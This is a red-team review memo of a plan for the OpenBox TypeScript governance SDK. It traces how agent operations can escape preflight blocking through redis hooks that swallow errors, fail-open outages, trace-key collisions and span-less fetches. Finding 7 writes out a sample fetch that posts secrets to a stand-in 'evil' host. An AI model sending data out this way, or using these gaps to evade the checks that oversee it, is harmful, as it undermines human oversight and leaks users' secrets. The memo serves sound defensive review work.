---
from: code-reviewer (red-team / Failure Mode Analyst + Flow Tracer)
to: planner
plan: 260708-0140-openbox-sdk-ts-base-sdk
date: 2026-07-08
verdict: DONE_WITH_CONCERNS (2 Critical, 4 High, 2 Medium)
---

# Red-Team Plan Review — Failure Mode Analyst

Hostile review of the OpenBox TS base SDK plan. Behavioral/ordering claims traced
against `openbox-sdk-python`, `openbox-core`, `openbox-mastra-sdk`, and the actual
`@opentelemetry/*` instrumentation code shipped in Mastra's `node_modules`. Every
finding is grounded in a real code path. No praise. Findings ordered by severity.

Bottom line: **the plan's single most important guarantee — "preflight blocks the
operation before execution" — is false for redis in Node, and silently conditional
for every surface during a Core outage.** Two of the plan's grounding claims
(researcher-04's redis feasibility; Phase 4's trace-key canonicalization) do not
survive contact with the actual Node runtime.

---

## Finding 1: Redis preflight blocking is IMPOSSIBLE with the Node OTel instrumentations the plan names

- **Severity:** Critical
- **Location:** plan `phase-05` (Tier A: "redis (OTel `request_hook` that can raise)" / "redis-governance-wrapper.ts — OTel request_hook preflight"); plan.md decision 15; research `researcher-04-...-report.md:56,89,301,368,470`.
- **Flaw:** The plan classifies redis as a Tier A *blocking* target delivered "via OTel `request_hook` that can raise", separate from pg (which the plan correctly says needs a custom wrapper). Traced against the real Node instrumentations this is impossible:
  - **node-redis v4/v5** (`@opentelemetry/instrumentation-redis`): there is **no `requestHook` at all**. `_traceClientCommand` starts a span then immediately dispatches the command via `origFunction.apply(origThis, origArguments)` — only a post-execution `responseHook` exists, and a throw from it is caught and logged, never propagated.
  - **ioredis** (`@opentelemetry/instrumentation-ioredis`): a `requestHook` exists and fires before dispatch, but it is invoked through `safeExecuteInTheMiddle(fn, onError, true)`. With `preventThrowingError=true` the hook's exception is swallowed (logged via `diag.error`) and the command dispatches on the next line regardless.
- **Failure scenario:** Operator enables redis governance, writes a policy that BLOCKs `FLUSHALL`/`SET secret …`. The adapter raises inside the request hook. On node-redis there is no hook to raise from; on ioredis the raise is swallowed. **The command reaches Redis every time.** The SDK reports redis as an installed blocking target (Phase 5 success criterion "BLOCK/HALT demonstrably prevents the real operation") while it is in fact telemetry-only. For a governance product this is a silent security failure — worse than not instrumenting redis, because operators believe it is enforced. The Python behavior the researcher generalized from (`db.py:400-421,443-456`) works only because *Python's* redis instrumentation calls `request_hook` synchronously before `execute_command` and propagates the raise; the Node ecosystem does not.
- **Evidence:**
  - `openbox-mastra-sdk/node_modules/@opentelemetry/instrumentation-ioredis/build/src/instrumentation.js:97-106` (requestHook via `safeExecuteInTheMiddle(..., true)`) and `:114` (`original.apply` dispatch after).
  - `openbox-mastra-sdk/node_modules/@opentelemetry/instrumentation/build/src/utils.js:35-37` (`if (error && !preventThrowingError) throw error;` → with `true` the error is swallowed).
  - `openbox-mastra-sdk/node_modules/@opentelemetry/instrumentation-redis/build/src/v4-v5/instrumentation.js:278-280` (command dispatch, no requestHook) and `:316-325` (`_endSpanWithResponse` responseHook wrapped in try/catch that swallows).
  - `openbox-sdk-python/openbox_core/instrumentation/db.py:412-421` (Python redis raises from request_hook — the source of the over-generalization).
- **Suggested fix:** Drop redis from Tier A. Redis blocking in Node requires a **custom wrapper** on `RedisClientType.sendCommand` / ioredis `Redis.prototype.sendCommand` (await preflight, then call original) exactly like pg — OTel hooks cannot block any Node driver. Reclassify redis as pg-tier (custom prototype wrapper) or telemetry-only. Correct researcher-04's redis rows. Add a Phase 5 test that asserts a BLOCK verdict prevents an actual `sendCommand` dispatch (not just that a hook was called).

---

## Finding 2: "Block-before-execute" silently evaporates during a Core outage — fail-open is the DEFAULT and disables ALL preflight blocking

- **Severity:** Critical
- **Location:** plan.md decision 6 + Risks; `phase-05` success criteria ("Started-hook BLOCK/HALT demonstrably prevents the real operation"); `phase-02` client fail-open; `phase-04` conformance ("fail-open vs fail-closed under network error").
- **Flaw:** The plan presents preflight blocking as an unconditional guarantee, but the default `on_api_error` is `fail_open`. Traced end to end: `preflight()` → gate → `client.evaluate()`; on any network failure the client returns an allow-shaped `EvaluationResult(fallback_used=true)` **without raising**, so `_decide_started` sees a non-stop verdict and returns `True` → the operation proceeds. This is identical on the hook path in Mastra. Therefore, for the entire duration of a Core outage (or DNS failure, or the SDK's own recursion-guard misfire), **every governed fetch / fs.writeFile / pg / redis / mongo op runs ungoverned**, including ones a live policy would BLOCK. The plan never states that its headline guarantee is conditional on Core reachability, and it makes fail-open the default while simultaneously *expanding* the blocking surface to destructive operations (file writes, DB writes) Python never blocked as its primary path.
- **Failure scenario:** Attacker (or a buggy agent) triggers data exfiltration via `fetch`/`fs.writeFile` during a 30s Core blip. Governance is a no-op for that window; nothing is blocked, and the only trace is a `logger.warning`. Because fail-open is the default, most deployments ship this posture unknowingly. Consistency note: lifecycle and hook paths *are* consistent (both fail open) — the flaw is the unstated conditional guarantee + default choice for new destructive surfaces, not an inconsistency.
- **Evidence:**
  - `openbox-sdk-python/openbox_core/client.py:214-219` (`_network_failure`: fail_open → `EvaluationResult.fallback_allow`, no raise) and `:183-191` (`evaluate` swallows network exception into `_network_failure`).
  - `openbox-sdk-python/openbox_core/hooks/preflight.py` `preflight()`/`_decide_started` — only `should_stop()` verdicts raise; a fallback-allow returns `True` (proceed).
  - `openbox-mastra-sdk/src/otel/setup-openbox-opentelemetry.ts:1537-1539` (`catch { if (onApiError === "fail_open") return; }` — hook proceeds on API error).
- **Suggested fix:** (a) Make the conditional explicit in Phase 5: "preflight blocks only while Core is reachable; under `fail_open` an outage disables blocking." (b) Consider `fail_closed` as the default for *destructive* hook types (db writes, file writes, non-idempotent HTTP) even when lifecycle stays fail-open — or at minimum a per-hook-type policy. (c) Phase 4 conformance MUST include a hook-path test: Core unreachable + a would-BLOCK policy ⇒ assert the op still ran under fail_open AND is refused under fail_closed. This is a user-facing security decision — surface it, do not bury it in decision 6.

---

## Finding 3: Trace-map canonical key via `parseInt(hex,16)` loses precision — regresses below BOTH reference implementations, causing cross-activity context misattribution

- **Severity:** High
- **Location:** `phase-04` Architecture ("Trace key canonicalized (OTel integer trace id; hex strings via `parseInt(hex,16)` / BigInt as needed)"); plan.md decision 13.
- **Flaw:** OTel trace ids are 128-bit (32 hex chars). `parseInt("....32hex....", 16)` in JS produces an IEEE-754 double; anything above 2^53 is rounded. Distinct trace ids collapse to the same key (collision) and a single trace id is not even represented stably. Python avoids this with arbitrary-precision `int(trace_id, 16)`; Mastra avoids it by keying on the **32-hex string** (`normalizeHexId(traceId, 32)`). The plan's proposed canonicalization is strictly worse than both things it claims to be grounded in — it *introduces* a defect neither reference has. "BigInt as needed" is hand-waved; parseInt must never be on this path.
- **Failure scenario:** Two concurrent activities with trace ids differing only in low bits map to the same numeric key. A DB/file hook that resolves context via the trace map (the whole reason the second lookup path exists — callbacks that lost async-local context) binds to the WRONG `ActivityContext`. Result: governance evaluates activity B's operation against activity A's identity/policy scope, and telemetry/PII is attributed to the wrong workflow run. Worst case an aborted activity's key collides with a live one and un-blocks it (see also Finding 8).
- **Evidence:**
  - `openbox-sdk-python/openbox_core/context.py:44-60` (`canonical_trace_key` → exact `int(trace_id, 16)`) and `:92-95` (map keyed by that int).
  - `openbox-mastra-sdk/src/span/openbox-span-processor.ts:101-103` (`Map<string,string>` trace maps) and `:127-134` (`normalizeHexId(traceId, 32)` → 32-hex string key).
- **Suggested fix:** Key the trace map by the canonical **32-hex string** (matches Mastra and the wire form) or by `BigInt("0x"+hex)`. Ban `parseInt` for trace ids in the plan text and add a collision test using two 128-bit ids that share the top 53 bits.

---

## Finding 4: Python `ContextVar.bind()→Token`/`reset(token)` does not map onto Node `AsyncLocalStorage` — the "guaranteed reset in finally" promise is unimplementable as specified

- **Severity:** High
- **Location:** `phase-04` (`ContextStore`: `bind`/`reset`/`currentActivityContext` (AsyncLocalStorage) … `activityScope(ctx,{traceId})` with guaranteed reset in `finally`); plan.md decision 13 ("`AsyncLocalStorage` (ContextVar analog)").
- **Flaw:** The plan ports Python's context API 1:1: `bind(ctx) -> Token`, `reset(token)`, and module-level `bind_activity_context`/`reset_activity_context`. Node's `AsyncLocalStorage` has **no set-returns-token / reset(token) API**. The only faithful scoping primitive is `als.run(store, cb)` (auto-unwinds at callback end) — which is exactly what the existing, working Mastra SDK uses. The token pattern can only be approximated with `als.enterWith(store)`, which sets the store for the current async execution and its descendants and provides **no restore of the previous value** for sibling async tasks; a later "reset" cannot unwind it. So the Python `activity_scope` contextmanager's `finally: reset(token)` — which truly restores the prior binding — cannot be reproduced. The plan's "guaranteed reset" is a promise the chosen primitive can't keep.
- **Failure scenario:** Nested/sequential activities in one async flow. Activity A binds via `enterWith`; A finishes and "resets"; but because `enterWith` has no restore, a concurrently-scheduled continuation (or the next microtask that was captured under A) still sees A's context — or, if implemented via re-`enterWith(previous)`, sibling tasks that already captured A observe stale/incorrect context. Under load this manifests as intermittent wrong-context governance that passes single-threaded tests and fails in production concurrency.
- **Evidence:**
  - `openbox-sdk-python/openbox_core/context.py:78-86` (`bind` returns `Token`; `reset(token)` restores) and `:159-206` (module `bind_activity_context`/`reset_activity_context` + `activity_scope` finally-reset).
  - `openbox-mastra-sdk/src/governance/context.ts:42-58` (the working TS pattern: `executionContextStore.run(nextContext, callback)` — no bind/reset/token).
- **Suggested fix:** Specify `activityScope` as a wrapper over `als.run(ctx, () => { register; try { return cb() } finally { unregister } })` and drop the `bind`/`reset(token)` surface (or make it explicitly `enterWith`-based, documented as non-restoring and for the trace-map path only). Do not present it as a ContextVar analog. Add a concurrency test: two overlapping `activityScope`s must never observe each other's context.

---

## Finding 5: Phase 6 partial migration double-governs pg — base's custom `Client.prototype.query` blocker AND Mastra's retained OTel-pg telemetry both fire for one query

- **Severity:** High
- **Location:** `phase-06` ("Stays in Mastra: `src/otel/setup-openbox-opentelemetry.ts`, `src/span/openbox-span-processor.ts`") + Implementation Step 3 (swap primitives "one surface at a time"); `phase-05` (base adds `postgres-client-query-wrapper.ts`).
- **Flaw:** Phase 6 explicitly keeps Mastra's `setup-openbox-opentelemetry.ts`, which registers `@opentelemetry/instrumentation-pg` with a `requestHook` that emits started/completed governance for every pg query (fire-and-forget: `void emit…().catch(()=>undefined)`). Phase 5 adds a base custom `Client.prototype.query` wrapper that *awaits* preflight and blocks. If Phase 6 wires the base runtime while the Mastra OTel pg instrumentation is still registered, **both fire for the same query**: the base wrapper (blocking, awaited) and the OTel requestHook (telemetry, swallowed). That is a duplicate governance event per query and two code paths with divergent verdict/fail-open handling running against the same operation during the "one surface at a time" window. The plan's migration order (config → identity → client → results → events → spans → runtime) never sequences *instrumentation* teardown, so there is a real intermediate state with two pg instrumentations live.
- **Failure scenario:** During migration, every SELECT produces two ActivityStarted hook events to Core (double counting, double policy evaluation, possible double approval prompt), and the telemetry path's swallowed errors mask failures the blocking path would surface. If a regression appears, the plan has no rollback story for "half base / half OTel" — Step 7 says only "remove duplicated internals after replacement has passing tests," which does not cover the instrumentation overlap.
- **Evidence:**
  - `openbox-mastra-sdk/src/otel/setup-openbox-opentelemetry.ts:604-665` (pg `requestHook`→`emitStarted`) and `:547-574` (`emitStarted` = `void emitDatabaseHookGovernance(...).catch(()=>undefined)` fire-and-forget) and `:735-812` (emits ActivityStarted governance per query).
  - `phase-06` "Stays in Mastra" list retains that file; `phase-05` adds `postgres-client-query-wrapper.ts` for the same driver.
- **Suggested fix:** Make instrumentation swap atomic per driver: when the base pg wrapper is installed, the Mastra OTel-pg governance config must be disabled in the same step (pass `instrumentDatabases:false` or drop pg from `dbLibraries`). Add a migration invariant test: exactly one governance event per pg query. Define an explicit rollback (feature-flag base vs legacy pg path) since Phase 6 mixes blocking and telemetry semantics for the same op.

---

## Finding 6: Approval polling loses Python's unreachable-Core budget — infinite poll / hung governed operation

- **Severity:** High
- **Location:** `phase-02` ("`pollApproval` returns `null` on network error / non-200"); `phase-04` (approval matrix: pending/rejected/approved/expired); plan Risks (approval "unknown → implicit allow" is covered, but the *timeout budget* is not).
- **Flaw:** Python's `ApprovalPoller` has two independent client-side stop conditions the plan omits: `max_wait_seconds` (total budget) and `max_consecutive_failures=60` (raise `ApprovalTimeoutError` after N failed polls so an unreachable Core cannot hang the governed thread forever). The plan only ports the single-shot `pollApproval` (null on failure = "still pending") plus server-side expiry parsing (`check_expiration`). Expiry is only set if the server *returns* `approval_expiration_time`; if Core is unreachable, every poll returns null (=pending) and there is nothing to make the loop terminate. Phase 4's success criteria enumerate approved/rejected/expired but not "Core-unreachable timeout," so the guard would not even be tested.
- **Failure scenario:** A REQUIRE_APPROVAL hook is hit, then Core goes unreachable. `pollApproval` returns null forever ⇒ the poller treats it as pending ⇒ the governed operation's thread/promise blocks indefinitely (no expiry ever arrives because the server that would send it is down). Under sync approval this wedges a worker; under async it leaks a never-resolving promise per pending approval. The plan's "server handles expiry" assumption fails exactly when the server is the thing that's down.
- **Evidence:**
  - `openbox-sdk-python/openbox_core/approvals.py:47,54-58` (`max_consecutive_failures` rationale) and `:77-87` / `:96-106` (both loops raise `ApprovalTimeoutError` on consecutive failures OR budget).
  - `openbox-sdk-python/openbox_core/client.py:223-233` (`poll_approval` returns None on failure = pending) and `:51-71` (`check_expiration` only acts when the server supplied a timestamp).
- **Suggested fix:** Port `ApprovalPoller` verbatim including `maxConsecutiveFailures` and `maxWaitMs` into Phase 2/4 (the plan currently names neither). Add a Phase 4 conformance case: Core unreachable during a pending approval ⇒ `ApprovalTimeoutError` after the budget, operation refused (fail-safe), not an infinite poll.

---

## Finding 7: fetch governance is skipped whenever there is no active span — the recursion guard is too broad and opens an exfiltration path

- **Severity:** Medium
- **Location:** plan.md Risks + `phase-05` ("Recursion guard: ignored-URL prefix … + a no-active-span / internal-call check").
- **Flaw:** The plan reuses Mastra's recursion-guard strategy where "no active OTel span" is treated as "SDK-internal, skip governance." Traced in the reference: `patchFetch` returns `originalFetch(request)` immediately when `trace.getActiveSpan()` is undefined. That guard cannot distinguish "the SDK's own evaluate call" from "any application/background fetch that happens to run outside a workflow span." Combined with Finding 4 (context that fails to propagate) and Finding 3 (trace-map miss), a governed request can silently fall out of governance.
- **Failure scenario:** A `setInterval`/background task, a detached `queueMicrotask`, or any code path where the workflow span didn't propagate issues `fetch("https://evil/exfil", {method:"POST", body: secrets})`. No active span ⇒ the patched fetch forwards to the original with zero governance. The URL-prefix guard for the OpenBox API is the only real recursion protection needed; the no-active-span clause disables governance for a broad, attacker-reachable class of calls.
- **Evidence:**
  - `openbox-mastra-sdk/src/otel/setup-openbox-opentelemetry.ts:836-840` (`const activeSpan = trace.getActiveSpan(); if (!activeSpan) return originalFetch(request);`).
- **Suggested fix:** Base recursion prevention on the ignored-URL prefix set plus an explicit internal-call flag (AsyncLocalStorage boolean set around the SDK's own client calls), not on "no active span." If a span is genuinely required for context, at least emit a diagnostic/counter for span-less governed URLs so the exfil path is observable rather than silent.

---

## Finding 8: Single process-global instrumentation + shared default context store — a second runtime's `init`/`close` silently disables or clears the first's governance

- **Severity:** Medium
- **Location:** `phase-05` ("`init` tears down prior patches first"; "module-level restore closures"; controller with `shutdown()`); plan Verification Gates (single global assumed).
- **Flaw:** The plan mirrors Mastra's module-global instrumentation state and Python's shared `default_context_store()` without addressing multiple runtimes / re-init in one process. Two concrete holes traced in the references:
  1. **Teardown-then-reinstall window:** `setupOpenBoxOpenTelemetry` calls `teardownActiveTelemetry()` first, then re-patches. Between restore and re-patch, `globalThis.fetch`/`fs` are the originals — any concurrent op in that window is ungoverned. The plan's "init tears down prior patches first" inherits this exact window and, if `init` is called concurrently, the module-global restore closures race.
  2. **Shared-state cross-runtime interference:** Python `OpenBoxRuntime` uses the process-wide `default_context_store()`; `close()` calls `context_store.clear()`, wiping the trace map, aborted-activity set, and halt flag. And instrumentation is guarded by *module* globals + a single `set_hook_runtime`. So runtime B's `close()` clears runtime A's `_aborted_activities` (un-blocking an activity A had BLOCKed), and B's teardown `set_hook_runtime(None)` leaves A's still-installed patches resolving to a null runtime (governance silently off) while A believes it is installed.
- **Failure scenario:** Multi-tenant host, test suites, or a framework that constructs two runtimes. Tenant A BLOCKs an activity; tenant B (or a test) closes its runtime; A's abort flag is cleared and A's patches go dormant — A's blocked operation now proceeds. No error is raised anywhere.
- **Evidence:**
  - `openbox-mastra-sdk/src/otel/setup-openbox-opentelemetry.ts:196-199,212,1118-1126` (module-global `active*` restore closures; setup tears down first).
  - `openbox-sdk-python/openbox_core/runtime.py:54` (defaults to shared `default_context_store()`) and `:128-132` (`close()` → `context_store.clear()`).
  - `openbox-sdk-python/openbox_core/context.py:142-147` (`clear()` wipes trace map + aborted set + halt).
  - `openbox-sdk-python/openbox_core/instrumentation/manager.py:69,128-129` (single global `set_hook_runtime`, nulled on any uninstall) and `db.py:106,377` (module-global install guards).
- **Suggested fix:** Decide and document a single-instance invariant: either enforce one process-wide instrumentation controller (throw on second `init` with a different config) or scope patches/hook-runtime/context-store per controller instance (no `default` global) so `close()` only affects its own state. Make `init` idempotent AND concurrency-safe (guard with a lock/flag, no bare teardown-then-reinstall). Add tests: second `init` does not create an ungoverned window; runtime B `close()` does not clear runtime A's aborted set.

---

## Cross-cutting observations (not separate findings)

- **Import-order ("driver created before init") is acknowledged but only "best-effort detected."** For a governance SDK, "governance silently off because a client was constructed before `initOpenBoxInstrumentation()`" is the same silent-failure class as Findings 1/2. The plan's mitigation (warn + lazy require) does not *fail* — it warns. Consider a hard opt-in "strict mode" that throws if a known driver client is detected against an unpatched prototype at init time.
- **DB completed-hook fire-and-forget in Mastra swallows errors** (`emitStarted`/`emitCompleted` → `void …catch(()=>undefined)`, setup-openbox `:566-573,594-601`). If Phase 6 reuses any of this for completed telemetry, verdict/halt signals raised in completed evaluation are lost. Base's `completed()` must not be fire-and-forget where it sets abort/halt flags for future ops.

## Unresolved questions

1. Does any target framework create one OTel trace per activity (making the trace-map key unique) or one per workflow-run with child-span activities (guaranteeing key collisions per Finding 3)? This determines whether Finding 3 is "precision loss" or "precision loss + guaranteed overwrite."
2. Is `fail_open` genuinely the intended default for the NEW destructive surfaces (fs/db writes), or was it inherited from Python's HTTP-centric origin (Finding 2)? User decision needed.
3. For redis (Finding 1): is a custom `sendCommand` wrapper acceptable for v1, or should redis drop to telemetry-only until then?
